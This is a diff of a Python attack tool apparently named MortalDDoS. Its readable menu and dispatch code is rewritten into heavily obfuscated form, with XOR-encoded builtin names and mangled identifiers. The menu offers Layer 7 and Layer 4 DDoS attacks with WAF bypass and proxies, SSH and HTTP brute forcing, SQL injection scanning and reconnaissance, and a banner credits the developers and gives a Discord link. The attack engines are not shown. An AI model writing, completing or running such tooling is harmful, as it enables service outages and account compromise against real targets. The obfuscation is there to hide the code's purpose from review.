+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 481759744864).to_bytes(5, 'big').decode())(1500986644)](f'{Fore.CYAN}' + (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3d') * (0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 209 for IlIlIIlIlIllllI in x[::-1]]).decode())([179]), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 110)) for IlIlIllIlIIlIlllI in x)))([91]), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 215) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e2'), 16)))
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 147) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e3e1fafde7')](f'{Fore.RED}Devs: KapiczeK and I Love Pizza {Fore.WHITE}|{Fore.RED} MortalDDOS Discord: {Fore.GREEN}https://discord.gg/GZv42uqH')
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 419451145807).to_bytes(5, 'big').decode())(76694282299)](f'{Fore.CYAN}' + (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3d') * (0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3562'), 16) ^ 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 26 for IlIlIIlIlIllllI in x[::-1]]).decode())([35, 34]), 16)))
 
     @staticmethod
-    def info_gathering_menu():
-        print("\n[1]  Nmap Scan")
-        print("[2]  Host to IP")
-        print("[3]  Port Scanner (Full Range)")
-        print("[0]  Back")
+    def llIIlIIlIIllIllIIIIIlllll():
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 165) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d5d7cccbd1')](f'\n[1]  {Fore.RED}Layer 7 DDoS Attack (HTTP/HTTPS)')
+        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 228 for IlIlIIlIlIllllI in x[::-1]]).decode())([144, 138, 141, 150, 148])](f'[2]  {Fore.RED}Layer 4 DDoS Attack (TCP/UDP)')
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 35) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('53514a4d57')](f'[3]  {Fore.RED}Information Gathering')
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 49) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('4143585f45')](f'[4]  {Fore.RED}Password Attacks')
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'[5]  {Fore.RED}Web Hacking')
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 22)) for IlIlIllIlIIlIlllI in x)))([102, 100, 127, 120, 98])](f'[0]  {Fore.RED}Exit')
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 517147234779).to_bytes(5, 'big').decode())(34796601263)](f'{Fore.CYAN}' + (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3d') * (0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('39'), 16) * 0 .__class__((lambda n: int.__xor__(n, 28).to_bytes(1, 'big').decode())(42), 16) + 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('36'), 16)))
 
     @staticmethod
-    def password_attacks_menu():
-        print("\n[1]  HTTP Bruteforce")
-        print("[2]  SSH Bruteforce")
-        print("[0]  Back")
+    def IIIlIIIlIlIlIlIIllllIlIll():
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 247) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('87859e9983')]((lambda n: int.__xor__(n, 692897088260729221572625134781241587).to_bytes(15, 'big').decode())(743335700857203113177858377302145437))
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 184) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('c8cad1d6cc')]((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 91 for IlIlIIlIlIllllI in x[::-1]]).decode())([11, 18, 123, 52, 47, 123, 47, 40, 52, 19, 123, 123, 6, 105, 0]))
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 11)) for IlIlIllIlIIlIlllI in x)))([123, 121, 98, 101, 127])]((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 14) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('553d532e2e5e617c7a2e5d6d6f60606b7c2e26487b62622e5c6f60696b27'))
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 41) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('595b40475d')]((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 188 for IlIlIIlIlIllllI in x[::-1]]).decode())([215, 223, 221, 254, 156, 156, 225, 140, 231]))
 
     @staticmethod
-    def web_hacking_menu():
-        print("\n[1]  SQL Injection Scanner")
-        print("[2]  Directory Finder")
-        print("[3]  CMS Detector")
-        print("[0]  Back")
+    def IIIlIIIIIIllllIIll():
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 958742094514).to_bytes(5, 'big').decode())(752878750918)]((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6563726f666574757242205054544820205d315b0a'))
+        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 72)) for IlIlIllIlIIlIlllI in x)))([56, 58, 33, 38, 60])]((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6563726f6665747572422048535320205d325b'))
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 302406041497).to_bytes(5, 'big').decode())(232375226861)]((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 59 for IlIlIIlIlIllllI in x[::-1]]).decode())([80, 88, 90, 121, 27, 27, 102, 11, 96]))
 
     @staticmethod
-    def run():
-        ddos_engine = MortalDDoS()
-        info_gather = InformationGathering()
-        proxy_manager = ProxyManager()
-        passwd_attack = PasswordAttacks()
-        web_hack = WebHacking()
-        
+    def IllIlIlIIIIllllIlIIIlIIII():
+        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')]((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 172 for IlIlIIlIlIllllI in x[::-1]]).decode())([222, 201, 194, 194, 205, 207, 255, 140, 194, 195, 197, 216, 207, 201, 198, 194, 229, 140, 224, 253, 255, 140, 140, 241, 157, 247, 166]))
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 54) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('46445f5842')]((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 55)) for IlIlIllIlIIlIlllI in x)))([108, 5, 106, 23, 23, 115, 94, 69, 82, 84, 67, 88, 69, 78, 23, 113, 94, 89, 83, 82, 69]))
+        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 158 for IlIlIIlIlIllllI in x[::-1]]).decode())([234, 240, 247, 236, 238])]((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('726f74636574654420534d4320205d335b'))
+        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 161 for IlIlIIlIlIllllI in x[::-1]]).decode())([213, 207, 200, 211, 209])]((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 186 for IlIlIIlIlIllllI in x[::-1]]).decode())([209, 217, 219, 248, 154, 154, 231, 138, 225]))
+
+    @staticmethod
+    def IlllIlllIlllII():
+        lIIlIlIIlllllIIIlIIll = lIIlIlIIllIIII()
+        IlIIlIlIIIlIllIl = lllIlIIllIlllll()
+        lIlllIlllllIIIllII = IlIIIlIlIIIllIIllIlIllllI()
+        IlllIllllIIl = IlIlllIlIIlIlIll()
+        lIlIIlIIlllIlllIIlI = lIlIIlIlIllII()
         while True:
-            MortalInterface.banner()
-            MortalInterface.main_menu()
-            
-            choice = input(f"\n{Fore.RED}Mortal@DDoS: {Fore.RESET}")
-            
-            if choice == "1":
-                target = input(f"{Fore.CYAN}Target URL (with http:// or https://): {Fore.WHITE}")
+            lIIIlIlIIIlIlI.lIIIlllIIlIl()
+            lIIIlIlIIIlIlI.llIIlIIlIIllIllIIIIIlllll()
+            choice = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 202) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a3a4babfbe')](f'\n{Fore.RED}Mortal@DDoS: {Fore.RESET}')
+            if choice == (lambda n: int.__xor__(n, 141).to_bytes(1, 'big').decode())(188):
+                target = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 147541790734).to_bytes(5, 'big').decode())(323001083258)](f'{Fore.CYAN}Target URL (with http:// or https://): {Fore.WHITE}')
                 if not target:
-                    print(f"{Fore.RED}[-] Target cannot be empty!")
-                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 168 for IlIlIIlIlIllllI in x[::-1]]).decode())([220, 198, 193, 218, 216])](f'{Fore.RED}[-] Target cannot be empty!')
+                    lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 54)) for IlIlIllIlIIlIlllI in x)))([95, 88, 70, 67, 66])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                     continue
-                    
                 try:
-                    duration = int(input(f"{Fore.CYAN}Attack Duration (seconds): {Fore.WHITE}"))
-                    if duration <= 0:
-                        print(f"{Fore.RED}[-] Duration must be positive!")
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    duration = lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 94)) for IlIlIllIlIIlIlllI in x)))([55, 48, 42])](lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'{Fore.CYAN}Attack Duration (seconds): {Fore.WHITE}'))
+                    if duration <= 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6438'), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('4438'), 16):
+                        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Duration must be positive!')
+                        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 176) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d9dec0c5c4')](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                         continue
                 except ValueError:
-                    print(f"{Fore.RED}[-] Invalid duration!")
-                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 140154490560).to_bytes(5, 'big').decode())(347149082804)](f'{Fore.RED}[-] Invalid duration!')
+                    lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                     continue
-                    
                 try:
-                    threads = int(input(f"{Fore.CYAN}Threads (1-1000, default 100): {Fore.WHITE}") or "100")
-                    threads = max(1, min(threads, 1000))
+                    threads = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 89) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('30372d')](lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 220 for IlIlIIlIlIllllI in x[::-1]]).decode())([168, 169, 172, 178, 181])](f'{Fore.CYAN}Threads (1-1000, default 100): {Fore.WHITE}') or (lambda n: int.__xor__(n, 12900004).to_bytes(3, 'big').decode())(16115348))
+                    threads = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 253) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('909c85')](0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('323031'), 16) - 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('313031'), 16), lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 3622675).to_bytes(3, 'big').decode())(5910141)](threads, 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 74 for IlIlIIlIlIllllI in x[::-1]]).decode())([125, 120, 126]), 16) - 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 67 for IlIlIIlIlIllllI in x[::-1]]).decode())([5, 112]), 16)))
                 except ValueError:
-                    threads = 100
-                    print(f"{Fore.YELLOW}[!] Invalid threads, using default: 100")
-                
-                # Proxy selection
-                proxies = proxy_manager.get_proxy_choice()
-                
-                # WAF bypass option
-                bypass_choice = input(f"{Fore.CYAN}Enable WAF bypass? (y/n, default y): {Fore.WHITE}").lower() or "y"
-                bypass_waf = bypass_choice == "y"
-                
-                print(f"{Fore.YELLOW}[+] Starting Layer 7 DDoS Attack...")
-                ddos_engine.layer7_ddos(target, duration, threads, proxies, bypass_waf)
-                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                
-            elif choice == "2":
-                ip = input(f"{Fore.CYAN}Target IP: {Fore.WHITE}")
-                if not ip:
-                    print(f"{Fore.RED}[-] IP cannot be empty!")
-                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    threads = 0 .__class__((lambda n: int.__xor__(n, 13147).to_bytes(2, 'big').decode())(1646), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 43943).to_bytes(2, 'big').decode())(39062), 16)
+                    lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 798006642980).to_bytes(5, 'big').decode())(866485430096)](f'{Fore.YELLOW}[!] Invalid threads, using default: 100')
+                proxies = lIlllIlllllIIIllII.IlIIIlllIIIIllIIIIllIllII()
+                llllIIIllIlIIIIIll = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 667825218557).to_bytes(5, 'big').decode())(1039701661321)](f'{Fore.CYAN}Enable WAF bypass? (y/n, default y): {Fore.WHITE}').lower() or (lambda n: int.__xor__(n, 241).to_bytes(1, 'big').decode())(136)
+                IlIIIllllIlllIlllll = llllIIIllIlIIIIIll == (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 9)) for IlIlIllIlIIlIlllI in x)))([112])
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 618906109857).to_bytes(5, 'big').decode())(963880724949)](f'{Fore.YELLOW}[+] Starting Layer 7 DDoS Attack...')
+                lIIlIlIIlllllIIIlIIll.llIIIIIIlllIIl(target, duration, threads, proxies, IlIIIllllIlllIlllll)
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+            elif choice == (lambda n: int.__xor__(n, 128).to_bytes(1, 'big').decode())(178):
+                lIlIllIlllIl = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 127 for IlIlIIlIlIllllI in x[::-1]]).decode())([11, 10, 15, 17, 22])](f'{Fore.CYAN}Target IP: {Fore.WHITE}')
+                if not lIlIllIlllIl:
+                    lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 242) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('82809b9c86')](f'{Fore.RED}[-] IP cannot be empty!')
+                    lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 56)) for IlIlIllIlIIlIlllI in x)))([81, 86, 72, 77, 76])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                     continue
-                    
                 try:
-                    port = int(input(f"{Fore.CYAN}Port (1-65535): {Fore.WHITE}"))
-                    if not (1 <= port <= 65535):
-                        print(f"{Fore.RED}[-] Invalid port number!")
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    port = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 111 for IlIlIIlIlIllllI in x[::-1]]).decode())([27, 1, 6])](lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'{Fore.CYAN}Port (1-65535): {Fore.WHITE}'))
+                    if not 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('33'), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 149) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a5'), 16) + 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31'), 16) <= port <= 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 49 for IlIlIIlIlIllllI in x[::-1]]).decode())([8]), 16) * 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31374331'), 16) + 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 25)) for IlIlIllIlIIlIlllI in x)))([47]), 16):
+                        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 20)) for IlIlIllIlIIlIlllI in x)))([100, 102, 125, 122, 96])](f'{Fore.RED}[-] Invalid port number!')
+                        lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 126)) for IlIlIllIlIIlIlllI in x)))([23, 16, 14, 11, 10])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                         continue
                 except ValueError:
-                    print(f"{Fore.RED}[-] Invalid port!")
-                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 208 for IlIlIIlIlIllllI in x[::-1]]).decode())([164, 190, 185, 162, 160])](f'{Fore.RED}[-] Invalid port!')
+                    lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 44)) for IlIlIllIlIIlIlllI in x)))([69, 66, 92, 89, 88])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                     continue
-                    
-                protocol = input(f"{Fore.CYAN}Protocol (tcp/udp, default tcp): {Fore.WHITE}") or "tcp"
-                if protocol.lower() not in ['tcp', 'udp']:
-                    print(f"{Fore.YELLOW}[!] Invalid protocol, using tcp")
-                    protocol = "tcp"
-                    
+                protocol = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 60 for IlIlIIlIlIllllI in x[::-1]]).decode())([72, 73, 76, 82, 85])](f'{Fore.CYAN}Protocol (tcp/udp, default tcp): {Fore.WHITE}') or (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 64) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('342330')
+                if protocol.lower() not in [(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 97)) for IlIlIllIlIIlIlllI in x)))([21, 2, 17]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('706475')]:
+                    lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 8) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('787a61667c')](f'{Fore.YELLOW}[!] Invalid protocol, using tcp')
+                    protocol = (lambda n: int.__xor__(n, 4201980).to_bytes(3, 'big').decode())(3440268)
                 try:
-                    duration = int(input(f"{Fore.CYAN}Attack Duration (seconds): {Fore.WHITE}"))
-                    if duration <= 0:
-                        print(f"{Fore.RED}[-] Duration must be positive!")
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    duration = lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 262074).to_bytes(3, 'big').decode())(6984142)](lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 406402880162).to_bytes(5, 'big').decode())(240267536342)](f'{Fore.CYAN}Attack Duration (seconds): {Fore.WHITE}'))
+                    if duration <= 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3342'), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 51687).to_bytes(2, 'big').decode())(43988), 16):
+                        lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Duration must be positive!')
+                        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 37 for IlIlIIlIlIllllI in x[::-1]]).decode())([81, 80, 85, 75, 76])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                         continue
                 except ValueError:
-                    print(f"{Fore.RED}[-] Invalid duration!")
-                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
+                    lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 185) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('c9cbd0d7cd')](f'{Fore.RED}[-] Invalid duration!')
+                    lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 241 for IlIlIIlIlIllllI in x[::-1]]).decode())([133, 132, 129, 159, 152])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
                     continue
-                
-                print(f"{Fore.YELLOW}[+] Starting Layer 4 {protocol.upper()} DDoS...")
-                ddos_engine.layer4_ddos(ip, port, duration, protocol)
-                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                
-            elif choice == "3":
+                lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 67)) for IlIlIllIlIIlIlllI in x)))([51, 49, 42, 45, 55])](f'{Fore.YELLOW}[+] Starting Layer 4 {protocol.upper()} DDoS...')
+                lIIlIlIIlllllIIIlIIll.llIIllllllllllIIlIIIlIl(lIlIllIlllIl, port, duration, protocol)
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 995343204499).to_bytes(5, 'big').decode())(613398377959)](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+            elif choice == (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 94 for IlIlIIlIlIllllI in x[::-1]]).decode())([109]):
                 while True:
-                    MortalInterface.banner()
-                    print(f"{Fore.CYAN}Information Gathering")
-                    MortalInterface.info_gathering_menu()
-                    sub_choice = input(f"\n{Fore.RED}InfoGather@Mortal: {Fore.RESET}")
-                    
-                    if sub_choice == "1":
-                        hostname = input(f"{Fore.CYAN}Target Hostname or IP: {Fore.WHITE}")
+                    lIIIlIlIIIlIlI.lIIIlllIIlIl()
+                    lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 221) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('adafb4b3a9')](f'{Fore.CYAN}Information Gathering')
+                    lIIIlIlIIIlIlI.IIIlIIIlIlIlIlIIllllIlIll()
+                    IlllIlIlIIIll = lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('7475706e69')](f'\n{Fore.RED}InfoGather@Mortal: {Fore.RESET}')
+                    if IlllIlIlIIIll == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('31'):
+                        hostname = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 237 for IlIlIIlIlIllllI in x[::-1]]).decode())([153, 152, 157, 131, 132])](f'{Fore.CYAN}Target Hostname or IP: {Fore.WHITE}')
                         if not hostname:
-                            print(f"{Fore.RED}[-] Hostname/IP cannot be empty!")
+                            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 140) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('fcfee5e2f8')](f'{Fore.RED}[-] Hostname/IP cannot be empty!')
                         else:
-                            ip = info_gather.host_to_ip(hostname) or hostname
-                            if ip:
-                                info_gather.nmap_scan(ip)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "2":
-                        hostname = input(f"{Fore.CYAN}Hostname to resolve: {Fore.WHITE}")
+                            lIlIllIlllIl = IlIIlIlIIIlIllIl.IllIIlIIIlIlIIlIllllI(hostname) or hostname
+                            if lIlIllIlllIl:
+                                IlIIlIlIIIlIllIl.llIIIIIIIllIIlIlllllIIIII(lIlIllIlllIl)
+                        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 480045821624).to_bytes(5, 'big').decode())(28630686668)](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('32'):
+                        hostname = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 66 for IlIlIIlIlIllllI in x[::-1]]).decode())([54, 55, 50, 44, 43])](f'{Fore.CYAN}Hostname to resolve: {Fore.WHITE}')
                         if not hostname:
-                            print(f"{Fore.RED}[-] Hostname cannot be empty!")
+                            lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 15)) for IlIlIllIlIIlIlllI in x)))([127, 125, 102, 97, 123])](f'{Fore.RED}[-] Hostname cannot be empty!')
                         else:
-                            info_gather.host_to_ip(hostname)
-                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
-                    elif sub_choice == "3":
-                        hostname = input(f"{Fore.CYAN}Target Hostname or IP: {Fore.WHITE}")
+                            IlIIlIlIIIlIllIl.IllIIlIIIlIlIIlIllllI(hostname)
+                        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 86 for IlIlIIlIlIllllI in x[::-1]]).decode())([34, 35, 38, 56, 63])](f'\n{Fore.CYAN}[+] Press Enter to continue...')
+                    elif IlllIlIlIIIll == (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 116)) for IlIlIllIlIIlIlllI in x)))([71]):
+                        hostname = lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 82 for IlIlIIlIlIllllI in x[::-1]]).decode())([38, 39, 34, 60, 59])](f'{Fore.CYAN}Target Hostname or IP: {Fore.WHITE}')
                         if not hostname:
-                            print(f"{Fore.RED}[-] Hostname/IP cannot be empty!")
